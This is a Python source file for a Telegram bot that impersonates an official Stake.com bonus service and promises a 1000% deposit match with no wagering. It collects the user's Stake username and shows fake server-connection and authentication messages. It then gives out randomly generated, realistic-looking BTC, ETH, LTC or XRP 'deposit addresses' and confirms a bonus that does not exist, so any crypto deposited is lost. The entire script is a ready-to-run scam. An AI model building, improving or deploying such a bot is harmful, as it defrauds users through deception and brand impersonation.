import logging
import random
import asyncio
import os
import string

from telethon import TelegramClient, events
from telethon.tl.custom import Button
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(level=logging.INFO)

# Retrieve sensitive data from environment variables
api_id = os.getenv("API_ID")
api_hash = os.getenv("API_HASH")
bot_token = os.getenv("BOT_TOKEN")

client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)

# User states
user_states = {}

# Simulated realistic address generation for different cryptocurrencies
def generate_realistic_address(crypto):
    if crypto == "Bitcoin":
        # Bitcoin addresses (P2PKH / P2SH / Bech32)
        prefixes = ['1', '3', 'bc1']
        prefix = random.choice(prefixes)
        length = random.randint(26, 35)  # Length of Bitcoin addresses can vary
    elif crypto == "Ethereum":
        # Ethereum address starts with '0x' and is 40 characters long
        prefix = "0x"
        length = 40
    elif crypto == "Litecoin":
        # Litecoin addresses start with 'L' or 'M' and are 34 characters long
        prefixes = ['L', 'M']
        prefix = random.choice(prefixes)
        length = 33  # Total length including the prefix is 34
    elif crypto == "Ripple":
        # Ripple addresses start with 'r' and are 33 characters long
        prefix = 'r'
        length = 32  # Total length including the prefix is 33
    else:
        return None  # If crypto is unknown

    # Generate a random alphanumeric string for the address (excluding the prefix)
    address_body = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    return f"{prefix}{address_body}"

# Menu for selecting cryptocurrency with buttons
crypto_menu = [
    [Button.text("Bitcoin (BTC)", resize=True), Button.text("Ethereum (ETH)", resize=True)],
    [Button.text("Litecoin (LTC)", resize=True), Button.text("Ripple (XRP)", resize=True)]
]

# Simulated deposit process with interactive buttons
async def simulate_deposit_process(username, event):
    try:
        await event.respond(
            f"Hello, {username} ✋\n\nClick the NEXT button to start the deposit bonus match process.\n\n(the entire process only takes 1 - 2 minutes.)",
            buttons=[Button.text("NEXT", resize=True)]
        )
        user_states[username] = 'next_step'  # Waiting for "NEXT" click
    except Exception as e:
        logging.error(f"Error during deposit process: {e}")
        await event.respond("Sorry, something went wrong. Please try again.")

# Handler for the /start command
@client.on(events.NewMessage(pattern='/start'))
async def start(event):
    try:
        welcome_message = (
            "Welcome to the Official Stake bonus bot where you can get special Stake bonuses available to every Stake user!\n\n"
            "🚀 1000% DEPOSIT MATCH BONUS\n\n"
            "🚨 Wager requirements: NONE\n\n"
            "🏧 EARLY ACCESS TO BONUSES\n\n"
            "🔽🔽🔽🔽🔽🔽🔽🔽🔽🔽\n\n"
            "What is your Stake.com username?\n\n"
            "Available Commands:\n"
            "/start - Start the process\n"
            "/refresh - Restart the process\n"
        )
        user_states[event.sender_id] = 'awaiting_username'  # Set state to await username
        await event.respond(welcome_message, buttons=[Button.text("Start Process", resize=True)])
        logging.info(f"Displayed welcome message to user {event.sender_id}")
    except Exception as e:
        logging.error(f"Error during /start: {e}")
        await event.respond("An error occurred, please try again later.")

# Handler for the /refresh command
@client.on(events.NewMessage(pattern='/refresh'))
async def refresh(event):
    try:
        user_id = event.sender_id
        user_states[user_id] = 'awaiting_username'  # Reset state to allow username input
        await event.respond(
            "You have successfully reset the process! Please provide your Stake.com username again.",
            buttons=[Button.text("Start Over", resize=True)]
        )
        logging.info(f"User {user_id} requested a refresh.")
    except Exception as e:
        logging.error(f"Error during refresh: {e}")
        await event.respond("Sorry, something went wrong while resetting the process.")

# Simulate server connection and data download
async def simulate_server_connection(event, username):
    try:
        loading_messages = [
            f"Connecting to the first available Stake.com server...\nRequesting account information...",
            "Connected to Server.....",
            "Downloading User Account data....",
            "Session Authenticated.",
            f"✅ Successfully connected to the Stake account"
        ]
        
        for msg in loading_messages:
            await event.respond(msg)
            await asyncio.sleep(1)  # Simulate delay between messages
    except Exception as e:
        logging.error(f"Error during server connection: {e}")
        await event.respond("Failed to connect to the server. Please try again later.")

# Handler for receiving username and starting the simulation
@client.on(events.NewMessage)
async def handle_user_input(event):
    try:
        user_id = event.sender_id
        user_state = user_states.get(user_id, None)
        message = event.text.strip()

        # Process user input based on their state
        if user_state == 'awaiting_username' and message != "/start":  # Ensure it's not the '/start' command
            if not message:
                await event.respond("Username cannot be empty. Please enter a valid Stake.com username.")
                return
            username = message
            user_states[user_id] = 'processing'
            await event.respond(f"Thank you! Received username: {username}\n\nStarting the process...")
            logging.info(f"Received Stake username '{username}' from user {user_id}")
            await simulate_deposit_process(username, event)
            user_states[user_id] = 'awaiting_next'  # Move to next state after username is received

        elif user_state == 'awaiting_next' and message == "NEXT":
            # Simulate server connection and proceed to crypto selection after "NEXT" click
            await simulate_server_connection(event, message)
            await event.respond(f"Select coin from listed coins below: ", buttons=[Button.text("Select Crypto", resize=True)])
            user_states[user_id] = 'awaiting_crypto_choice'  # Wait for crypto selection

        elif user_state == 'awaiting_crypto_choice':
            # Show crypto selection buttons
            await event.respond(
                "Please select the cryptocurrency you want for the deposit bonus:",
                buttons=crypto_menu
            )
            user_states[user_id] = 'awaiting_coin_selection'  # Update state to await coin selection

        elif message in ['Bitcoin (BTC)', 'Ethereum (ETH)', 'Litecoin (LTC)', 'Ripple (XRP)']:
            # Generate a realistic address based on the selected cryptocurrency
            selected_crypto = message.split()[0]  # Extract the cryptocurrency name (BTC, ETH, LTC, XRP)
            unique_address = generate_realistic_address(selected_crypto)
            if unique_address:
                await event.respond(
                    f"Your unique deposit address for {selected_crypto} is:\n\n"
                    f"🚼 {unique_address}\n\n"
                    "🟨After you have sent your deposit, please click the continue button.\n\n",
                    buttons=[Button.text("Continue", resize=True)]
                )
                user_states[user_id] = 'awaiting_continue'  # Wait for continue
            else:
                await event.respond("Sorry, an error occurred while generating the address. Please try again.")

        elif user_state == 'awaiting_continue' and message == "Continue":
            await event.respond(
                f"Great! After you click the submit button, your 1000% deposit match bonus claim will be completed.",
                buttons=[Button.text("Submit", resize=True)]
            )
            user_states[user_id] = 'awaiting_submit'  # Wait for submit
            
        elif user_state == 'awaiting_submit' and message == "Submit":
            await event.respond(f"Process completed! Your bonus claim has been successfully submitted!")
            user_states[user_id] = None  # Reset state after process completion
            logging.info(f"User {user_id} completed the process")

        elif user_state is None:
            # User needs to restart the flow
            await event.respond("Please type /start to begin the process.")
            logging.info(f"Prompted user {user_id} to restart the flow.")
    except Exception as e:
        logging.error(f"Error during user input handling: {e}")
        await event.respond("Sorry, something went wrong while processing your input. Please try again.")

# Start the client
client.start()
client.run_until_disconnected()
